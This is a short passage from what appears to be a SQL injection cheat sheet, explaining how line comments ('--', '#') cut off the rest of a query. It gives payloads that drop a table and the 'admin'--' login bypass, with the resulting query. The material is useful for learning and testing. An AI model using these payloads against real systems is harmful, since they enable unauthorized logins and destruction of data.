Put a line comment at the end to comment out the rest of the query. Line comments are typically used to ignore the rest of the original query so you don’t need to worry about ensuring valid syntax after the injection point.

- `--` (SMPOL)   
    `DROP sampletable;--` 
- `#` (M)   
    `DROP sampletable;#`

A common example is logging in as admin:

- Injection into the `username` parameter with a single quote: `admin'--`
- `SELECT * FROM members WHERE username = '**admin'--**' AND password = 'password'`   
    If successful, this will log you as the admin user because the rest of the SQL query after `--` will be ignored.
